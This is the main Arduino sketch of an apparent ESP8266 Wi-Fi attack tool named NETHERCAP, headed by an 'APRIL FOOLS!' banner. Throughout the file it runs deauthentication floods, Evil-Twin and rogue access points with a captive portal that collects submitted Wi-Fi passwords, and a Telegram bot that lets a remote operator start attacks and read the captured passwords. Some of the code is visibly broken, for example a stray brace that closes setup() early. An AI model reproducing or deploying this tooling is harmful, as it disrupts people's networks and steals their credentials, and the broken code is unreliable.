
  
  
  
           _____  _____  _____ _        ______ ____   ____  _       _____   _ 
     /\   |  __ \|  __ \|_   _| |      |  ____/ __ \ / __ \| |     / ____| | |
    /  \  | |__) | |__) | | | | |      | |__ | |  | | |  | | |    | (___   | |
   / /\ \ |  ___/|  _  /  | | | |      |  __|| |  | | |  | | |     \___ \  | |
  / ____ \| |    | | \ \ _| |_| |____  | |   | |__| | |__| | |____ ____) | |_|
 /_/    \_\_|    |_|  \_\_____|______| |_|    \____/ \____/|______|_____/  (_)
                                                                             





























#include <Arduino.h>
#include <FS.h>
#include <EEPROM.h>
#include <ESP8266WiFi.h>
#include "CTBot.h"
#include <ESPxWebFlMgr.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <espnow.h>
#define flipDisplay true //for OLED
#include <Wire.h>
#include <WiFiClientSecure.h>
#include <ArduinoJson.h>
#include <ESP_Mail_Client.h>
#include <NTPClient.h>
#include <WiFiUdp.h>
#include "SSD1306.h"
#include "config.h"
#include "sniffer.h"
#include "pong.h"
#include "JSON.h"
#include "functions.h"
#include "extender.h"
#include "bootAnimation.h"
#include "bitmap.h"
#include "captive_default.h"
#include "scan.h"
#include "handleresult.h"
#include "adminpage.h"
#include "fsbrowser.h"
#include "monitorpage.h"
#include "htmlmenu.h"
#include "eeprom_rw.h"
#include "display.h"
#include "deauth.h"
#include "webhandler.h"
#include "remote.h"



void setup() { 
  Serial.begin(115200);}    
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, LOW); 
  
  display.init();if (flipDisplay) display.flipScreenVertically();display.clear();  
  if(!LittleFS.begin()){
  Serial.println(F("An Error has occurred while mounting LittleFS"));display.drawString(0,0, F("FS ERROR!"));display.display();delay(99999);}
  loadSettingJSON();
  EEPROM.begin(8);
  
                                                                              
  if(EEPROM.read(1) == 1){Serial.println(F("EEPROM flag says start extender"));extender_start();} else  {Serial.println(F("EEPROM flag says just boot normally"));}

  WiFi.disconnect();

  delay(10);
  
  //extender
  ESPxWebFlMgr_FileSystem.begin();
  filemgr.begin();                                                                  

  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex);                                                                                  
  
  webServer.on("/result", handleResult);                                                                          
  webServer.on("/monitor", handleMonitor);                                                                       
  webServer.on("/reboot", handleReboot); 
  webServer.on("/sniffer", handleSniffer);                                                                           
  webServer.on("/preview", handlePreview);                                                                          
  webServer.on("/htmlmenu", handleHTMLmenu); 
  webServer.on("/settings", handleSettings);
  webServer.on("/delete", handleFileDelete);

  webServer.on("/fsbrowser", HTTP_GET, []() {handleFSbrowser();});
  webServer.on("/fsbrowser", HTTP_POST,                       // if the client posts to the upload page
    [](){ webServer.send(200); },                          // Send status 200 (OK) to tell the client we are ready to receive
    handleFileUpload                                    // Receive and save the file
  );
  
  //webServer.on("/fsbrowser", HTTP_GET, handleFSbrowser);
  //webServer.on("/fsbrowser", HTTP_POST, handleFileUpload);
  webServer.on("/pause_deauth", handlePauseDeauth); 
  webServer.on("/resume_deauth", handleResumeDeauth);
  webServer.on("/list", handleFileList);
  webServer.on("/start_deauth", handleStartDeauth); 
  webServer.on("/stop_deauth", handleStopDeauth);
  webServer.on("/stop_ap", handleStopAP);
  webServer.on("/config.json", serveJSON);
  webServer.on("/log", serveLogPage);
  webServer.on("/CurrentTarget", serveCurrentTarget);
  webServer.on("/WifiStatus", serveWifiStatus);
  webServer.on("/passwordstatus", servePasswordStatus);
  webServer.on("/audio.mp3", serveAudio);


  //File Browser

  webServer.onNotFound(handleIndex);                                                                                // Show handleIndex when none of address above is entered
  webServer.begin();                                                                                                // Start web server
                                                                                               // Prevent ESP8266 from reconnecting to previous target 

  if (esp_now_init() != 0) {
    Serial.println("Cannot start ESP-NOW");
    return;
  }

  esp_now_set_self_role(ESP_NOW_ROLE_COMBO);
  esp_now_register_send_cb(OnDataSent);
  esp_now_register_recv_cb(OnDataRecv);

                                                                           

  if (instantBoot == true)  {
  display.clear();
  display.drawString(1, 25, "NETHERCAP");
  display.drawString(Xpos0, line3, "VERSION 2.0");
  display.display();
  showLogo();
  display.display();

  delay(10);
  
  WiFi.mode(WIFI_AP_STA);                                                                                         
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_Password);
  delay(10);      
  Serial.println(F("Scanning..."));delay(100);performScan_boot();delay(100);}
  else {bootAnimation();} 

  scanner_active = true;
  scanner_async_active = false;
  OLED_now = millis();

  Serial.println(F("Obtaining wifi status and Chip ID"));
  Serial.println(String(WiFi.status()));
  Serial.println(String(ESP.getChipId()));
  
  Serial.println(F("Decipher OK!"));

  Serial.println(F("Allocating memory"));
  reserveVar();
  pinMode(D7, INPUT_PULLUP);  
  pinMode(D2, INPUT);    

  if (resumeFlag == "true") {
    Serial.println(F("Resuming..."));
    if (Internet_SSID != "" && Internet_Password != ""){WiFi.begin(Internet_SSID, Internet_Password);}
    resumeCountdown();
    if  (attackMode == "Etwin" && currentTarget_str != ""){etwin_resume();}
    if  (attackMode == "RogueAP"){rogueAP_resume();} 
    } else {currentTarget_str = "";};

  
  digitalWrite(BUILTIN_LED, HIGH); 

  myBot.setTelegramToken(Telegram_Token);

  // check if all things are ok
  if (myBot.testConnection())
    Serial.println("\ntestConnection OK");
  else
    Serial.println("\ntestConnection NOK");

  delay(10);

  if (Internet_SSID != "" && Internet_Password != ""){WiFi.begin(Internet_SSID, Internet_Password);}
  

}


void loop() {                                                                                                       // <<<<LOOP STARTS HERE>>>> 
  delay(10);
  dnsServer.processNextRequest();
  webServer.handleClient();delay(1);
  filemgr.handleClient();

  if (millis() - telegramCheck >= telegramCheck_freq && WiFi.status() == WL_CONNECTED){
     if (CTBotMessageText == myBot.getNewMessage(msg)) {
          Serial.println(F("Checking telegram..."));
          String msgText = msg.text;
          Serial.println(msgText);
          Serial.println(msg.text.substring(0,10));


          if(msg.text.length() <= 2){
            indexMatch = false;
            if (((msg.text.toInt()) >= 0 ) && (msg.text.toInt()) <= 16){
              for (int number = 0; number < 16; number++) {
                if (msg.text.toInt() == number){
                   indexMatch = true;
                   _selectedNetwork = _networks[number];
                   _selectedNetwork_array[number] = _networks[number];
                   currentTarget_str = String(_selectedNetwork.ssid.c_str());
                   Serial.println(F("Target has been set"));
                   myBot.sendMessage(msg.sender.id, F("Target set OK"));
                   OLED_refresh();
                      reply = F("Target List: ");
                      reply += F("\n");
              
                      for (int number = 0; number < 16; number++) {
                        if ( _networks[number].ssid == F("")) {                                                   
                          continue;
                          }
                        if ( _networks[number].ssid == _selectedNetwork.ssid) {                                                   
                          reply += F("[->]");
                          }
                        else {
                          reply += "[" + String(number) + "]";
                         
                        
                        }
                          
                          reply += _networks[number].ssid + "(" + _networks[number].rs + "%)";
                          reply += F("\n");
                      }
                      myBot.sendMessage(msg.sender.id, reply);
                      return;
                    }
              }
            }
          }

          if (msg.text.equalsIgnoreCase(F("LIGHT ON"))) {              // if the received message is "LIGHT ON"...
            digitalWrite(BUILTIN_LED, LOW);                               // turn on the LED (inverted logic!)
            myBot.sendMessage(msg.sender.id, F("Light is now ON"));  // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("LIGHT OFF"))) {        // if the received message is "LIGHT OFF"...
            digitalWrite(BUILTIN_LED, HIGH);                              // turn off the led (inverted logic!)
            myBot.sendMessage(msg.sender.id, F("Light is now OFF")); // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("TARGET LIST"))) {  
            digitalWrite(BUILTIN_LED, LOW);
    
            performScan();
                 
            reply = F("Target List: ");
            reply += F("\n");
    
            for (int number = 0; number < 16; number++) {
              if ( _networks[number].ssid == F("")) {                                                   
                continue;
                }
              if ( _networks[number].ssid == _selectedNetwork.ssid) {                                                   
                reply += F("[->]");
                }
              else {
                reply += "[" + String(number) + "]";
               
              
              }
                
                reply += _networks[number].ssid + "(" + _networks[number].rs + "%)";
                reply += F("\n");
            }
            reply += F("\n");
            reply += F("Choose target by entering the number");
            myBot.sendMessage(msg.sender.id, reply);
            digitalWrite(BUILTIN_LED, HIGH);     
          }

          else if (msg.text.equalsIgnoreCase(F("ETWIN START"))) {        // if the received message is "LIGHT OFF"...
            if (currentTarget_str != "")  {etwin_start();                          // turn off the led (inverted logic!)
                myBot.sendMessage(msg.sender.id, F("Evil-Twin start OK")); // notify the sender
                }
            else {myBot.sendMessage(msg.sender.id, F("You need to choose the target first"));}
          }
          else if (msg.text.equalsIgnoreCase(F("ETWIN STOP"))) {        // if the received message is "LIGHT OFF"...
            myBot.sendMessage(msg.sender.id, F("Evil-Twin stop OK"));
            handleStopAP();                          // turn off the led (inverted logic!)
            if (Internet_SSID != "" && Internet_Password != ""){WiFi.begin(Internet_SSID, Internet_Password);}
             // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("ROGUE START"))) {        // if the received message is "LIGHT OFF"...
            rogueAP_start();                          // turn off the led (inverted logic!)
            myBot.sendMessage(msg.sender.id, F("Rogue AP start OK")); // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("ROGUE STOP"))) {        // if the received message is "LIGHT OFF"...
            myBot.sendMessage(msg.sender.id, F("RogueAP stop OK"));
            handleStopAP();                          // turn off the led (inverted logic!)
            if (Internet_SSID != "" && Internet_Password != ""){WiFi.begin(Internet_SSID, Internet_Password);}
             
          }





          
          else if (msg.text.equalsIgnoreCase(F("DEAUTHALL ON"))) {        // if the received message is "LIGHT OFF"...
            deauthAll_active = true;                            // turn off the led (inverted logic!)
            myBot.sendMessage(msg.sender.id, F("DeauthAll ON")); // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("DEAUTHALL OFF"))) {        // if the received message is "LIGHT OFF"...
            deauthAll_active = false;                            // turn off the led (inverted logic!)
            myBot.sendMessage(msg.sender.id, F("DeauthAll OFF")); // notify the sender
          }
          else if (msg.text.equalsIgnoreCase(F("DEAUTH ON"))) {      
            deauthing_active = true;                        
            myBot.sendMessage(msg.sender.id, F("Deauth ON")); 
          }
          else if (msg.text.equalsIgnoreCase(F("DEAUTH OFF"))) {        
            deauthing_active = false;                           
            myBot.sendMessage(msg.sender.id, F("Deauth OFF")); 
          }
          else if (msg.text.equalsIgnoreCase(F("STATUS"))) {   
          reply = "";     
          reply += F("Current target: ");reply += currentTarget_str;reply += F("\n");
          reply += F("Current target BSSID: ");reply += String(bytesToStr(_selectedNetwork.bssid, 6));reply += F("\n");
          reply += F("Current target channel: ");reply += String(_selectedNetwork.ch);reply += F("\n");
          reply += F("Deauth: ");reply += deauthing_active_str;reply += F("\n");
          reply += F("Deauth All: ");reply += deauthAll_active_str;reply += F("\n");
          reply += F("Evil-Twin: ");reply += hotspot_active_str;reply += F("\n");
          reply += F("Rogue AP: ");reply += roguehotspot_active_str;reply += F("\n");
          reply += F("Client(s) connected: ");reply += clientsConnected_str;reply += F("\n");
          reply += F("Client(s) seen: ");reply += String(clientsSeen);reply += F("\n");
          reply += F("AP(s) scanned: ");reply += scannedNetworks_str;reply += F("\n");
          reply += F("Password(s) submitted: ");reply += passwordSubmitted_str;reply += F("\n");
          reply += F("Current password: ");reply += _tryPassword;reply += F("\n");
          reply += logs_monitorpage;

          myBot.sendMessage(msg.sender.id, reply);
          return;
          }

          
          else {                                              // otherwise...
            // generate the message for the sender
            String reply;
            reply = F("Welcome to NETHERCAP Bot. Here is the command list:\n");
            reply += F("- TARGET LIST\n");
            reply += F("- DEAUTH ON/OFF\n");
            reply += F("- DEAUTHALL ON/OFF\n");
            reply += F("- ETWIN START/STOP\n");
            reply += F("- ROGUE START/STOP\n");
            reply += F("- STATUS\n");
            myBot.sendMessage(msg.sender.id, reply);    

          }  

      }
  telegramCheck = millis();
  }











  if (wifi_softap_get_station_num() > 0){telegramCheck_freq = 10000;}


  if (millis() - connectToInternet >= 180000){
      if (Internet_SSID != "" && Internet_Password != ""){WiFi.begin(Internet_SSID, Internet_Password);}
      connectToInternet = millis();
  }

  if (millis() - button_now >= 50){
  handleButton();
  button_now=millis();
  }



  if (millis() - ticker5second >= 2000) {                                                           // Deauth a station every 150 miliseconds
      D_freq = 150;
      DA_freq = 150;
      scanner_active = true;
      ticker5second = millis();
      }
      
  if (millis() - ticker3mins >= 180000) {                                                           // Deauth a station every 150 miliseconds
      telegramCheck_freq = 1000;
      ticker3mins = millis();
      }      

  if (millis() - blink_now >= 10000) {                                                           // Deauth a station every 150 miliseconds
    blinkDeauth();
    blink_now = millis();
    }
      
  if (deauthing_active == true && millis() - deauth_now >= D_freq) {                                                           // Deauth a station every 150 miliseconds
    deauth();
    deauthMode = "Deauth";
    }

  if (deauthAll_active == true && millis() - deauth_now >= DA_freq) {                                                           // Deauth all station every 150 miliseconds
    deauthAll();
    deauthMode = "DeauthAll";
    }


    
  if (millis() - now >= 180000) {                                                                                    // Scan every 30 seconds
    if (scanner_active == true) {
      if (wifi_softap_get_station_num() == 0)  {
        WiFi.scanNetworksAsync(asyncScan);
        } else  {
          performScan();
          }
      } 
  }

  if (millis() - OLED_now >= OLED_timeout) {                                                                                    // Disable OLED every 5 minutes
    if (OLED_active == true)  {
        OLED_active = false;
    }
    }
    
  if (passwordCaptured == true) {
      digitalWrite(BUILTIN_LED, LOW); 
      delay(1);                      
      digitalWrite(BUILTIN_LED, HIGH);  
      delay(10);                                                     
  }

  if (millis() - animationSwitch >= 500 ) {
    switch (animationState) {
    case 1:
      animationState = 2;
      break;
    case 2:
      animationState = 3;
      break;
    case 3:
      animationState = 4;
      break;
    case 4:
      animationState = 1;
      break;
    }

    //Serial.println("animation switch");
    animationSwitch = millis();

  } 
  
  if (millis() - displaynow >= OLED_freq && measure_active == false) {                                                                                // Refresh page every 200 miliseconds
      //filemgr.handleClient();
      OLED_refresh();
  } else if (millis() - displaynow >= OLED_freq && measure_active == true){
    display.clear();
    if (percent != 100){int oldpercent = percent;}
    percent = dBmtoPercentage(WiFi.RSSI());

    if (percent < 20){LED_delay = 500;} else if (percent < 40){LED_delay = 250;} else if (percent < 60){LED_delay = 100;} else if (percent < 80){LED_delay = 50;} else if (percent > 80){LED_delay = 5;}
    
    //if(percent != 100){display.drawProgressBar(Xpos0, line1, 63, 10, percent);} else {display.drawProgressBar(Xpos0, line1, 63, 10, 0);percent = 0;}
    if(WiFi.RSSI() != 31){display.drawProgressBar(Xpos0, line1, 63, 10, percent);} else {display.drawProgressBar(Xpos0, line1, 63, 10, oldpercent);}
    display.drawString(0, 15, " " + String(WiFi.RSSI()) + " dBm");
    display.drawString(0, 30, "Sig. " + String(percent) + " %");
    display.display();

    digitalWrite(BUILTIN_LED, LOW); 
    delay(LED_delay);                      
    digitalWrite(BUILTIN_LED, HIGH); 
    delay(LED_delay); 
    }

}
